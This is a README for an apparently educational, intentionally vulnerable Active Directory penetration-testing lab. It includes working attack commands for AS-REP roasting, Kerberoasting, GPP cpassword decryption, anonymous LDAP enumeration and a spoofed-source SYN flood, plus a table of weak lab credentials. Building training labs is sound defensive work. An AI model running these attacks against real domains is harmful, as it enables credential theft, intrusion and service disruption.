
<div align="center">

# 🏴 Active Directory Penetration Testing Lab

### A Hands-On Vulnerable Active Directory Lab for Cybersecurity Practice

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-VirtualBox-blue)](https://www.virtualbox.org/)
[![OS](https://img.shields.io/badge/Target-Windows%20Server%202022-0078d4)](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022)
[![Attacker](https://img.shields.io/badge/Attacker-Kali%20Linux-557C94)](https://www.kali.org/)
[![CEH](https://img.shields.io/badge/Exam%20Prep-CEH%20v13-red)](https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/)
[![Stars](https://img.shields.io/github/stars/iambharath-s/active-directory-lab?style=social)](https://github.com/iambharath-s/active-directory-lab)

**Build and practice against an intentionally vulnerable
Windows Server 2022 Active Directory environment.**

Designed for cybersecurity beginners, CEH students,
and penetration testers who want hands-on practice
with Active Directory attack techniques.

- 1 Windows Server 2022 Domain Controller
- 13 intentionally configured attack surfaces
- Kali Linux as the attacker machine
- VirtualBox and PowerShell for lab setup

Setup time: estimated at under 2 hours, depending
on your hardware and familiarity with the setup process.

[Quick Start](#-quick-start) ·
[Attack Matrix](#-attack-matrix) ·
[Documentation](docs/) ·
[Troubleshooting](docs/troubleshooting.md)

</div>

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     VirtualBox Host-Only Network                         │
│                          192.168.56.0/24                                 │
│                                                                          │
│   ┌──────────────────────────────┐      ┌────────────────────────────┐  │
│   │          DC01                │      │        KALI-ATK01          │  │
│   │   Windows Server 2022        │      │       Kali Linux           │  │
│   │      corp.lab                │      │                            │  │
│   │    192.168.56.10             │◄────►│      192.168.56.20         │  │
│   │                              │      │  eth0: lab  eth1: internet │  │
│   │  ● Active Directory / DNS    │      │                            │  │
│   │  ● Kerberos (port 88)        │      │  All attack tools          │  │
│   │  ● LDAP (port 389)           │      │  pre-installed on Kali     │  │
│   │  ● SMB (port 445)            │      └────────────────────────────┘  │
│   │  ● SNMP (port 161/UDP)       │                                      │
│   │  ● RDP (port 3389)           │                                      │
│   │  ● WinRM (port 5985)         │                                      │
│   └──────────────────────────────┘                                      │
│                                                                          │
│   Your Physical Host (192.168.56.1)                                     │
│   Zero attack traffic reaches the internet — fully isolated             │
└─────────────────────────────────────────────────────────────────────────┘
```

---


## 🏗️ High-View

This diagram illustrates the lab infrastructure,
including the Kali attacker machine, Windows Server
domain controller, and isolated VirtualBox network.

![Active Directory penetration testing lab
architecture showing Kali Linux, DC01,
and domain services](images/architecture.png)

*The lab is intended for isolated, authorized
penetration testing practice.*


## ⚔️ Attack Matrix

| # | Attack | Technique | Tool | MITRE ATT&CK |
|---|--------|-----------|------|--------------|
| 1 | DNS Zone Transfer | AXFR misconfiguration | `dig`, `dnsrecon` | T1590.002 |
| 2 | LDAP Anonymous Bind | Unauthenticated enumeration | `ldapsearch` | T1087.002 |
| 3 | AS-REP Roasting | No pre-auth on `john.doe` | `GetNPUsers.py` + `hashcat` | T1558.004 |
| 4 | Kerberoasting | SPN on `svc-mssql` | `GetUserSPNs.py` + `hashcat` | T1558.003 |
| 5 | GPP cpassword | MS14-025, real SYSVOL | `gpp-decrypt` | T1552.006 |
| 6 | ACL Abuse | `helpdesk` → GenericAll | `BloodHound` | T1484.001 |
| 7 | SMB Null Sessions | Anonymous share enumeration | `smbclient`, `enum4linux-ng` | T1135 |
| 8 | SNMP Enumeration | Public community string | `snmpwalk`, `onesixtyone` | T1046 |
| 9 | LLMNR Poisoning | NTLMv2 hash capture | `Responder` | T1557.001 |
| 10 | Pass-the-Hash | Lateral movement | `crackmapexec`, `evil-winrm` | T1550.002 |
| 11 | Credential Dumping | SAM / NTDS harvest | `secretsdump.py`, `mimikatz` | T1003.002 |
| 12 | Privilege Escalation | AlwaysInstallElevated | `msfvenom` + `msiexec` | T1611 |
| 13 | DoS / DDoS | SYN / UDP / ICMP / Slowloris | `hping3`, `slowhttptest` | T1498 |

---

## ⚡ Quick Start

> Full prerequisites at [docs/prerequisites.md](docs/prerequisites.md)

**Step 1 — Download ISOs**
| File | Source |
|------|--------|
| Windows Server 2022 Evaluation | [Microsoft Eval Center](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022) |
| Kali Linux Installer 64-bit | [kali.org](https://www.kali.org/get-kali/#kali-installer-images) |

**Step 2 — Create VirtualBox Host-Only Network**

```
VirtualBox → File → Tools → Network Manager
→ Create (+) → IPv4: 192.168.56.1/24 → DHCP: OFF → Apply
```

**Step 3 — Build DC01 and run setup scripts**

```powershell
# Inside DC01 — run in order, reboot when prompted
.\setup\dc01\01-static-ip.ps1
.\setup\dc01\02-install-adds.ps1
.\setup\dc01\03-password-policy.ps1
.\setup\dc01\04-create-ous.ps1
.\setup\dc01\05-create-users.ps1
.\setup\dc01\06-create-groups.ps1
.\setup\dc01\07-misconfigs.ps1
.\setup\dc01\08-services.ps1
```

**Step 4 — Verify from Kali**

```bash
bash attacks/verify-lab.sh
# All 12 checks must pass
```

---

## 📁 Repository Structure

```
active-directory-lab/
│
├── 📄 README.md                  ← You are here
├── 📄 LICENSE
├── 📄 SECURITY.md                ← Legal disclaimer and responsible use
├── 📄 CONTRIBUTING.md
├── 📄 CHANGELOG.md
│
├── 📂 docs/                      ← Detailed documentation
│   ├── prerequisites.md          ← System requirements and downloads
│   ├── network-setup.md          ← VirtualBox network configuration
│   ├── troubleshooting.md        ← Every error we hit + verified fix
│   └── attack-reference.md       ← All attack commands with explanations
│
├── 📂 setup/                     ← Setup scripts (run in order)
│   ├── dc01/
│   │   ├── 01-static-ip.ps1      ← Set static IP, rename to DC01
│   │   ├── 02-install-adds.ps1   ← Install AD DS, promote DC
│   │   ├── 03-password-policy.ps1 ← Fix MinPasswordAge
│   │   ├── 04-create-ous.ps1     ← OU structure
│   │   ├── 05-create-users.ps1   ← Domain users + weak passwords
│   │   ├── 06-create-groups.ps1  ← Security groups
│   │   ├── 07-misconfigs.ps1     ← All 6 AD attack surfaces
│   │   └── 08-services.ps1       ← SNMP, RDP, WinRM, SMB shares
│   └── kali/
│       └── 01-network.sh         ← Permanent dual-adapter config
│
├── 📂 attacks/                   ← Attack scripts (run from Kali)
│   ├── 01-enumeration.sh         ← DNS, LDAP, SMB, SNMP recon
│   ├── 02-kerberos.sh            ← AS-REP roast + Kerberoast + crack
│   ├── 03-lateral-movement.sh    ← PtH, evil-winrm, secretsdump
│   ├── 04-dos-attacks.sh         ← SYN/UDP/ICMP/Smurf/Slowloris
│   └── verify-lab.sh             ← Verify all attack surfaces work
│
└── 📂 configs/                   ← Config file references
    └── kali-interfaces           ← Permanent Kali network config
```

---

## 🎯 Attack Demos

### AS-REP Roasting (No Credentials → Hash → Cracked Password)

```bash
# Step 1: Get hash for john.doe (no creds needed)
GetNPUsers.py corp.lab/ -usersfile users.txt -dc-ip 192.168.56.10 -format hashcat -outputfile asrep.txt

# Step 2: Crack it
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Result: john.doe:Welcome1!
```

### Kerberoasting (One Cred → Service Account Hash → Cracked)

```bash
GetUserSPNs.py corp.lab/john.doe:'Welcome1!' -dc-ip 192.168.56.10 -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# Result: svc-mssql:MssqlSvc2024!
```

### GPP cpassword (SYSVOL → Encrypted Password → Instant Decrypt)

```bash
smbclient //192.168.56.10/SYSVOL -U 'CORP\john.doe%Welcome1!' \
    -c "get corp.lab/Policies/{BADCAFE1-0001-0001-0001-BADCAFE10001}/Machine/Preferences/Groups/Groups.xml /tmp/Groups.xml"
gpp-decrypt $(grep -oP 'cpassword="\K[^"]+' /tmp/Groups.xml)

# Result: Summer2024!
```

### LDAP Anonymous Enumeration (Zero Creds → Full User List)

```bash
ldapsearch -x -H ldap://192.168.56.10 -b "DC=corp,DC=lab" "(objectClass=user)" sAMAccountName
```

### SYN Flood DoS

```bash
sudo hping3 -S -p 445 -c 15000 -d 120 -w 64 --rand-source 192.168.56.10
```

---

## 🔑 Credentials

> These credentials are intentionally weak — for training only.

| Account | Password | Vulnerability |
|---------|----------|---------------|
| `CORP\Administrator` | `P@ssw0rd123!` | Domain Admin |
| `CORP\john.doe` | `Welcome1!` | AS-REP Roastable |
| `CORP\jane.smith` | `Summer2024!` | Local Admin |
| `CORP\bob.jones` | `Password1` | Spray target |
| `CORP\helpdesk` | `Tr0ub4dor&3!` | GenericAll ACL abuse |
| `CORP\svc-mssql` | `MssqlSvc2024!` | Kerberoastable (SPN) |
| `CORP\svc-backup` | `Qw7#rTzv2024` | Backup Operators |
| `CORP\svc-monitor` | `Monitor@2024` | Password in description |

**GPP cpassword:**
```
DFo58CwlYMizGqNu0IyQQPemXgiR7wPmLYMy9GZFytw  →  Summer2024!
```

---

## 📋 Requirements

| Item | Spec |
|------|------|
| Host RAM | 8 GB minimum (16 GB recommended) |
| Host Disk | 80 GB free |
| Host CPU | 4 cores, VT-x or AMD-V enabled in BIOS |
| VirtualBox | 7.0.x or 7.1.x + Extension Pack |
| DC01 RAM | 4096 MB |
| Kali RAM | 3072 MB |

---

## 📚 Documentation

| Doc | Description |
|-----|-------------|
| [Prerequisites](docs/prerequisites.md) | Detailed system requirements and ISO downloads |
| [Network Setup](docs/network-setup.md) | VirtualBox host-only adapter configuration |
| [Troubleshooting](docs/troubleshooting.md) | Every error encountered + verified fix |
| [Attack Reference](docs/attack-reference.md) | All 13 attacks with full command explanations |

---

## 🤝 Contributing

Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

Issues to open: new attack techniques, additional misconfigurations, bug fixes in scripts.

---

## ⚖️ Legal Disclaimer

This lab is for **authorized penetration testing training only**.

- Use only against systems you own or have explicit written permission to test
- Do not deploy this environment on a public network or the internet
- Every misconfiguration is intentional for educational purposes — never replicate in production
- The authors are not responsible for misuse of any content in this repository

---

## 👤 Author

**Bharath**
Cybersecurity Student & Security Researcher


[![GitHub](https://img.shields.io/badge/GitHub-iambharath--s-black?logo=github)](https://github.com/iambharath-s)

---

<div align="center">
Built for the security community. Star ⭐ if this helped your CEH prep.
</div>
